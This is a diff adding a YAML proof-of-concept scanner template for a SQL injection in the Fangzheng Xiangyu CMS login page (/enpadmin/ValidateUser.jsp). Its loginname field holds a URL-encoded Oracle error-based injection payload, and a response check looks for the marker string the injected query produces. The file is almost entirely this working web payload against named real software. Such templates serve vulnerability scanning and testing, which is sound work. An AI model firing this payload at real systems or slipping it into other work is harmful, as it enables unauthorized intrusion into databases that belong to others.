@@ -1,0 +1,16 @@
+name: poc-yaml-fangzhengxiangyu-cms-sqli
+rules:
+  - method: GET
+    path: /enpadmin/ValidateUser.jsp
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: >
+      loginname=11%27||%28SELECT%20%27HgsB%27%20FROM%20DUAL%20WHERE%207849=7849%20AND%208951=%28SELECT%20UPPER%28XMLType%28CHR%2860%29||CHR%2858%29||CHR%28113%29||CHR%28112%29||CHR%28118%29||CHR%28113%29||CHR%28113%29||%28SELECT%20%28CASE%20WHEN%20%288951=8951%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29||CHR%28113%29||CHR%28106%29||CHR%28122%29||CHR%28112%29||CHR%28113%29||CHR%2862%29%29%29%20FROM%20DUAL%29%29||%27&userpwd=11
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b"qpvqq1qjzpq")
+detail:
+  author: Explo1t
+  links:
+    - https://github.com/epony4c
+    - https://shuimugan.com/bug/view?bug_no=82293
